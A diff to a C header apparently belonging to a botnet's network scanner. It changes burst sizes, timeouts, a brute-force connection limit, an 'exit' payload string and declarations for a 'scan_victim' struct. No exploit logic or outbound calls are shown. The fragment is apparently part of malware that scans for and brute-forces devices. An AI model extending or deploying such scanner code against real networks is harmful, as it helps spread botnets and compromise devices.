@@ -1,20 +1,18 @@
 #pragma once
 
-#define SCANNER_FORCE TRUE
-// #define SCANNER_TEST TRUE // Scanner test mode
+#define SCANNER_TEST TRUE
 #define SCAN_SCANNER_BURST 200 // How many packets to send out each burst
 #define SCAN_SCANNER_MAXCON 10 // Maximum connections white bruteforcing
 #define SCAN_SCANNER_TIMEOUT_SEC 1 // Scanner send and connect timeout in seconds
 #define SCAN_SCANNER_TIMEOUT_USEC 0 // Scanner send and connect timeout in seconds
 #define SCAN_SCANNER_STIMEOUT_SEC 1 // Scanner select timeout in seconds
 #define SCAN_SCANNER_STIMEOUT_USEC 0 // Scanner select timeout in useconds
-#define SCAN_SCANNER_PAYLOAD "exit\r\n\0"
+#define SCAN_SCANNER_PAYLOAD "exit\r\n"
 #define SCAN_SCANNER_PAYLOAD_LEN 6
 
 #ifdef SCANNER_TEST
-#define SCANNER_FORCE TRUE
 #ifndef DEBUG
-CLANG_ERR("Including SCANNER_TEST in a non DEBUG build")
+clang_err("Including SCANNER_TEST in a non DEBUG build")
 #endif
 #endif
 
@@ -82,7 +80,7 @@ Good ranges?
 
 static char *ranges[] =
 {
-	// Add these bitch
+	// Add these 
 };
 */
 
@@ -105,5 +103,5 @@ struct scan_victim
 	uint8_t tries;
 };
 
-void scan_init();
-bool scan_scanner();
+void scan_init(void);
+bool scan_scanner(void);
